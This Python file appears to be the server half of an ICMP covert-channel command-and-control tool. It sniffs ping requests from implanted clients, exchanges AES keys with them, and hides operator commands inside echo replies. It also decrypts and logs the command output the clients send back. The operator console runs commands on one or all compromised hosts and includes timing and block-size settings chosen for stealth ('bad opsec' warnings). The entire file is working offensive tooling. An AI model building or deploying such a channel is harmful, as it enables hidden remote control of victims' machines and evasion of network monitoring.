from scapy.all import *
import signal, sys, threading
from prompt_toolkit import PromptSession
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.keys import Keys
from scapy.layers.inet import ICMP, IP

from crypto import *
from client_manager import *
from client import *
from context_manager import *



def print_clients():
    if client_manager.get_clients():
        print_formatted_text(FormattedText([
                ('class:ul_bold', f"\nClient ID\t\tUser\t\t\t\t\tTimeout\t\t\tCommand\t\t\t\t\tOutput file")
            ]), style=style)
        
        for client in client_manager.get_clients():
            client.print_info(client_manager.get_client_active())
                    
    else:
        print("No clients connected :/")

def errors():
    while True:
        for client in client_manager.get_clients():
            if client.get_client_ready():
                if not client.check_if_alive():
                    print_clients()

def clients_dashboard():
    while True:
        try:
            cmd = session.prompt(FormattedText([
                ('class:bright',"\n> " if len(client_manager.get_client_active()) == 0 else f"\n{client_manager.get_client_active()}> ")
                ]), style=style).strip()
            if cmd == "clients":
                print_clients()
            
            elif cmd == "help":
                print("Commands:"
                      "\n- clients\t\tShows connected clients"
                      "\n- use <IP>\t\tSelect a client"
                      "\n- cmd <cmd>\t\tRun a command on the selected client (e.g. 'cmd whoami')"
                      "\n\n\t<cmd> can also be a keyword that the client handles separately:"
                      "\n\t- cmd cancel\t\t\If the client is running a command, this will cancel it"
                      "\n\t- cmd delay <seconds>\t\tChanges the delay between each packet sent from client (default: 0.5 seconds)"
                      "\n\t- cmd timeout <seconds>\t\tChanges the clients sleep time (default: 10 seconds)"
                      "\n\t- cmd updateAES\t\t\tClient regenerates AES key and nonce, and sends it back to the server"
                      "\n\n- info\t\t\tShows metadata about the selected client"
                      #"\n- block: <True/False>\tIf client sends response in blocks of bytes or not"
                      "\n- blocksize <bytes>\tAllowed blocksize (in bytes) is from 1 up to and including 1472")
            elif cmd == "info":
                for client in client_manager.get_clients():
                    if client.get_id() == client_manager.get_client_active():
                        client.print_attributes()
            elif cmd.startswith("cmd "):
                if client_manager.get_client_active():
                    client = client_manager.get_client(client_manager.get_client_active())
                    if cmd.split()[1] == "clear":
                        client.set_server_command("")
                    elif cmd.split()[1] == "cancel":
                        print_formatted_text(FormattedText([
                                ('class:bright', '[INFO] '),
                                ('class:bright', f'Canceling execution of command: {client.get_server_command()[:15]}')
                                ]), style=style)
                        client.cleanup()
                        client.set_server_command(cmd.split()[1])
                    else:
                        client.set_server_command(' '.join(cmd.split()[1:]))
                    print_clients()
                else:
                    if cmd.split()[1] == "all":
                        client_manager.cmd_all_clients(' '.join(cmd.split()[2:]))
                        print_clients()
                    else:
                        print("No active client. Activate by using 'use <IP>'")
                
            elif cmd.startswith("block: "):
                for client in client_manager.get_clients():
                    if client.get_id() == client_manager.get_client_active():
                        if cmd.split()[1] == "True":
                            client.set_server_command(cmd)
                            client.set_block(True)
                            print_formatted_text(FormattedText([
                                ('class:bright', '[INFO] '),
                                ('class:bright', f'Client: {client.get_id()} is sending response in blocks of bytes (fast)')
                            ]), style=style)
                        if cmd.split()[1] == "False":
                            client.set_server_command(cmd)
                            client.set_block(False)
                            print_formatted_text(FormattedText([
                                ('class:bright', '[INFO] '),
                                ('class:bright', f'Client: {client.get_id()} is sending response 1 byte at a time (slow)')
                            ]), style=style)
                print_clients()

            elif cmd.startswith("blocksize "):
                for client in client_manager.get_clients():
                    if client.get_id() == client_manager.get_client_active():
                        if cmd.split()[1].isdigit():
                            """
                            ADVANCED MTU CONFIGURATION
                            """

                            # Standard MTU is 1500
                            # Default max data we can send in data payload header of an ICMP packet is therefore:
                                # 20 bytes (IP header) + 8 bytes (ICMP header) + 1472 bytes (data payload) = 1500 bytes
                                # Wireshark adds the Ethernet layer on top of this, which results in a size of 1514 bytes in total

                            # If bigger blocksize is needed, first check if Jumbo Packet can be enabled on the network adapter:
                                # Get-NetAdapterAdvancedProperty -RegistryKeyword "*JumboPacket"
                                    # If the current network adapter is displayed here:
                                        # Enable Jumbo Packet on CLIENT (require administrator privileges):
                                            # Set-NetAdapterAdvancedProperty -Name "<network adapter name>" -DisplayName "Jumbo Packet" -DisplayValue "Enabled (9014)"
                                            # This will increase the limit to 8972 bytes, inclusive.
                                    # If not, you have to change the current network adapter somehow

                            # Then you can increase the MTU on the CLIENT:
                                # netsh interface ipv4 set subinterface "<network adapter name>" mtu=<value <= 9000> store=persistent

                            # Final step is to increase MTU on SERVER as well
                                # sudo ip link set dev <network adapter name> mtu 10000

                            if int(cmd.split()[1]) > 1472:
                                print_formatted_text(FormattedText([
                                    ('class:bright', '[INFO] '),
                                    ('class:bright', f'{cmd.split()[1]} bytes not allowed. Maximum size allowed is 1472 bytes')
                                ]), style=style)
                                continue
                            elif int(cmd.split()[1]) != 32:
                                confirmation = input(f"Bad opsec to change blocksize to anything else than 32 bytes. Continue? (y/N)")
                                if confirmation.lower() == "y":
                                    client.set_blocksize(int(cmd.split()[1]))
                                    client.set_server_command(cmd)
                                else:
                                    pass
                            else:
                                client.set_blocksize(32)
                                client.set_server_command("blocksize: 32")
                print_clients()

            elif cmd.startswith("use "):
                if client_manager.get_client_active() and cmd.split()[1] == "none":
                    client_manager.clear_client_active()
                    continue
                if client_manager.get_clients():
                    for client in client_manager.get_clients():
                        if cmd.split()[1] == client.get_id():
                            client_manager.set_client_active(client)
                else:
                    print("No clients connected :/")
            
        except (EOFError, KeyboardInterrupt):
            # Handle end of file (Ctrl+D) or interrupt (Ctrl+C)
            break




def read_cmd(ip_adr):
    for client in client_manager.get_clients():
        if client.get_id() == ip_adr:
            cmd = client.get_server_command()

            if cmd == "updateAES":
                client.setUpdateAES(True)
            client.set_server_command("")
            if len(cmd) > 1:
                # hacky solution so that it doesn't clean up the first part of "OK: Cancel"
                if cmd.lower() == "cancel" and len(client.get_encrypted_hex_block()) >= 32:
                    client.cleanup()
                elif cmd.lower() == "init ok":
                    client.set_server_command("")
                try:
                    client.set_executed_command(cmd)
                    return encrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(), cmd)
                except Exception as error:
                    print("(read_cmd) An error occurred:", error)
            else:
                return "abcdefghijklmnopqrstuvwabcdefghi"


def reply_to_ping(packet):
    if packet[ICMP].id == 20:
        response = read_client(packet)
        
        if response == 33:
            print("sending error")
            
            ip_adr = packet[IP].src
            
            
            ip_layer = packet[IP]
            icmp_layer = packet[ICMP]

            
            ip_reply = IP(src=ip_layer.dst, dst=ip_layer.src, id=0x13)
            icmp_reply = ICMP(type=0, id=icmp_layer.id, seq=icmp_layer.seq)
            
            payload = "error"
            reply_packet = ip_reply / icmp_reply / payload

            # Send the reply
            send(reply_packet, verbose=0)
            return


        if ICMP in packet and packet[ICMP].type == 8 and response != "disconnected":  # ICMP Echo Request

            ip_adr = packet[IP].src
            
            
            ip_layer = packet[IP]
            icmp_layer = packet[ICMP]

            
            ip_reply = IP(src=ip_layer.dst, dst=ip_layer.src, id=0x13)
            icmp_reply = ICMP(type=0, id=icmp_layer.id, seq=icmp_layer.seq)
            
            payload = read_cmd(ip_adr)

            reply_packet = ip_reply / icmp_reply / payload

            # Send the reply
            send(reply_packet, verbose=0)




def write_result_to_file(client):
    if not os.path.exists(client.get_id()):
        os.makedirs(client.get_id())
    date_time = datetime.datetime.now().strftime("%D - %H:%M:%S ")
    if client.get_client_response():
        if (client.get_client_response() != "¤ping" and client.get_server_command()) or (not client.get_server_command()):
            with open(client.get_id()+"/output.txt", 'a') as f:
                f.write(date_time + "\n" + f"User: {client.get_whoami()}\n" + f"Server command: {client.get_server_command()}\n" + client.get_client_response()+"\n\n")
                  

def read_client(packet):
    if packet.haslayer(ICMP):
        if ICMP in packet and packet[ICMP].type == 8:  # ICMP Echo Request
            
            ## INITIAL CONNECT FROM CLIENT (receive encrypted AES key and nonce, and whoami-command)
            # first packet is 14, last is 80 (for knowing when client is finished sending data)
            if packet[ICMP].seq == 14 or packet[ICMP].seq == 80:
                
                ## add client if not already in list
                if client_manager.get_clients():
                    found = False
                    # At this point, we could already be on packet nr 2 (if get_clients() returned False)
                    # Also, we could be on packet nr 1 because get_clients() returned True (this means either this is a new client, or a reconnecting client)
                    for client in client_manager.get_clients():
                        if packet[IP].src == client.get_id() and not client.get_client_ready():
                            found = True
                            client.set_encrypted_hex_block(packet[Raw].load.decode())
                            # Last packet in this cycle, decrypt data from client
                            if packet[ICMP].seq == 80:
                                try:
                                    client.initialize()
                                    client_manager.add_client(client)
                                    print_clients()
                                    return
                                except Exception as error:
                                    print("An error occurred:", error)
                                    print(f"Initialization with IP:{packet[IP].src} failed")
                                    client.cleanup()
                                    client_manager.remove_client(client)
                                    return 33

                    # First packet: add client to list of clients, then proceed to main loop (clients already registered)
                    if not found:
                        new_client = Client(id=packet[IP].src, encrypted_hex_block=remove_padded_zeroes(packet[Raw].load.decode()), client_manager=client_manager)
                        client_manager.add_client(new_client)

                # First packet: add client to list of clients, then proceed to main loop (zero clients registered)
                else:
                    new_client = Client(id=packet[IP].src, encrypted_hex_block=remove_padded_zeroes(packet[Raw].load.decode()), client_manager=client_manager)
                    client_manager.add_client(new_client)

                
            ## CLIENT HAS ALREADY CONNECTED
            else:
                
                for client in client_manager.get_clients():
                    #print(client.get_encrypted_hex_block())
                    if packet[IP].src == client.get_id():
                        if client.get_block() and 'Q' not in packet[Raw].load.decode():
                            client.set_encrypted_hex_block(packet[Raw].load.decode())

                        client.update()

                        if packet[ICMP].seq == 13 and not client.get_executed_command() == "cancel":
                            client.set_command_executing(True)

                        if packet[ICMP].seq == 37:
                            if client.get_executed_command() == "cancel":
                                try:
                                    client.set_client_response(decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(),remove_padded_zeroes(client.get_encrypted_hex_block())))
                                except Exception as error:
                                    print("An error occurred2:", error)
                                    print()
                            else:
                                try:
                                    # First packets from CLIENT is always "!ping" (this is the check-in packet to see if SERVER has commands waiting).
                                    # We skip these packets, otherwise the decryption of the newly generated key and nonce fails.
                                    # This means that we cant call updateAES before CLIENT has sent their first ping packet
                                    if client.getUpdateAES() and not remove_padded_zeroes(client.get_encrypted_hex_block()) == client.get_ping_encrypted():
                                        client.updateAES()
                                    else:
                                        client.set_client_response(decrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(), remove_padded_zeroes(client.get_encrypted_hex_block())))
                                        # Storing the encrypted version of "!ping", so that it can be filtered out when decrypting data from CLIENT (like when updating AES key and nonce)
                                        if not client.get_ping_encrypted() and client.get_client_response() == "!ping":
                                            client.set_ping_encrypted(remove_padded_zeroes(client.get_encrypted_hex_block()))
                                        write_result_to_file(client)
                                except Exception as error:
                                    print("An error occurred:", error)
                                    client.set_server_command("")

                            status = client.handle_response()
                            if status == "disconnected":
                                return "disconnected"
                            else:
                                client.cleanup()




# Function to stop packet capture and print results
def stop_capture(signal, frame):
    print("\nStopping capture...")
    #print(f"Captured TOS values: {[hex(tos) for tos in tos_values]}")
    sys.exit(0)

if __name__ == "__main__":

    # Set up signal handler to stop capture on Ctrl+C
    signal.signal(signal.SIGINT, stop_capture)

    
    print_formatted_text(FormattedText([
                            ('class:fg_rgb', """  ___ ____ ____  __  __ ____  
 |_ _/ ___|___ \|  \/  |  _ \ 
  | | |     __) | |\/| | |_) |
  | | |___ / __/| |  | |  __/ 
 |___\____|_____|_|  |_|_|    
                              """)
                        ]), style=style)


    client_manager = ClientManager()



    style = Style.from_dict({
        'red': 'ansired',
        'green': 'ansigreen',
        'bold_blue': 'ansiblue bold',
        'bright_yellow': 'ansiyellow',
        'bg_magenta': 'bg:ansimagenta',
        'bg_rgb': 'bg:#222222',
        'fg_rgb': '#ff00ff',
        'bright': 'ansiwhite bold',
        'ul_bold':'underline bold'
    })

    # Create a key bindings object
    kb = KeyBindings()

    # Add the control-z key binding to suspend the application
    @kb.add(Keys.ControlZ)
    def _(event):
        os.kill(os.getpid(), signal.SIGTSTP)


    # Define a list of commands
    commands = ['clients', 'help', 'use ', 'cmd ','blocksize ']
    


    session = PromptSession(key_bindings=kb, enable_suspend=True, completer=ContextSensitiveCompleter(commands, client_manager.get_use_options()))
    

    # Create and start the clients_dashboard thread
    t1 = threading.Thread(target=clients_dashboard, name='t1')
    t1.start()

    # Create and start a thread for sniffing
    t2 = threading.Thread(target=sniff, kwargs={'filter': 'icmp', 'prn': reply_to_ping})
    t2.start()

    # Create and start a thread for sniffing
    t3 = threading.Thread(target=errors(), name='t3')
    t3.start()

    # Optionally, join threads if you want to wait for them to finish
    t1.join()
    t2.join()
    t3.join()

